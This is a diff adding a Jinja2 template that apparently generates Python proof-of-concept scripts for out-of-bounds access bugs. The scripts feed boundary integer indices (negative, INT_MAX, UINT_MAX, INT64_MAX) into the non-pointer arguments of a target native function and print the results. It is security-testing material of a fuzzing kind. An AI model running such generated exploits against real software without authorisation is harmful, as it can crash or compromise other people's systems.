@@ -1,0 +1,49 @@
+{% extends "poc/base.py.j2" %}
+
+{% block description %}Out-of-bounds {{ mode | default('access') }} vulnerability{% endblock %}
+
+{% block payload %}
+# OOB test indices
+TEST_INDICES = [
+    (-1, "Negative index"),
+    (0x7FFFFFFF, "INT_MAX"),
+    (0xFFFFFFFF, "UINT_MAX (32-bit)"),
+    (0x100, "Small overflow"),
+    (0x1000, "Medium overflow"),
+    (0x10000, "Large overflow"),
+    (0x7FFFFFFFFFFFFFFF, "INT64_MAX"),
+]
+{% endblock %}
+
+{% block exploit_doc %}Trigger out-of-bounds {{ mode | default('access') }}{% endblock %}
+
+{% block exploit_body %}
+        print(f"[*] OOB {{ mode | default('access') }} via: {{ sink_api }}")
+{% if arg_count and arg_count > 1 %}
+        print(f"[*] Function takes {{ arg_count }} arguments")
+{% endif %}
+
+        # 找出整数参数位置 (索引参数)
+        int_arg_indices = []
+        for i, info in enumerate(ARGS_INFO):
+            is_ptr = info.get('is_pointer', False) or '*' in info.get('type', '')
+            if not is_ptr:
+                int_arg_indices.append(i)
+        if not int_arg_indices:
+            int_arg_indices = [0]
+
+        for arg_idx in int_arg_indices:
+            print(f"\n[*] Testing argument {arg_idx}:")
+            for idx, desc in TEST_INDICES:
+                print(f"\n[*] Testing index: 0x{idx:x} ({desc})")
+                try:
+                    args = arg_builder.build(idx, payload_arg_idx=arg_idx)
+                    result = func(*args)
+                    print(f"    -> Returned: {result}")
+                except OSError as e:
+                    print(f"    -> Windows Error: {e}")
+                except Exception as e:
+                    print(f"    -> Exception: {type(e).__name__}: {e}")
+
+        print("\n[+] All indices tested")
+{% endblock %}
